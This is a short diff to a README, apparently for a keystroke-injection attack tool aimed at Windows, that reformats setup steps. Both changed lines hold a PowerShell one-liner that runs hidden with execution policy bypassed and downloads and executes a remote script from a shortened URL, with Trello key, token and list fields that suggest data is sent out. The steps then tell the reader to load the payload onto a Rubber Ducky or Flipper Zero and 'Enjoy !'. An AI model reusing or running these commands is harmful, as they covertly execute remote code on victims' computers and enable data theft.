@@ -89,8 +89,8 @@ ________________________________________________________________________________
       - $key = "YOUR_API_KEY_FROM"
       - $token = "YOUR_TOKEN_FROM"
     - 2.2 - Modifying the [.txt] file : 
-      - *powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/wBFLV | iex* **for W1ns1d3r_f4st_Tr3ll0** ( line 23 )
-      - *powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/gpvF5 | iex* **for W1ns1d3r_st4gg3d_Tr3ll0** ( line 53 )
+      - ```powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/wBFLV | iex``` **for W1ns1d3r_f4st_Tr3ll0** ( line 23 )
+      - ```powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/gpvF5 | iex``` **for W1ns1d3r_st4gg3d_Tr3ll0** ( line 53 )
     - 3 - Put the modified [.txt] file into your Rubber Ducky or Flipper Zero
     - 4 - Enjoy !
 
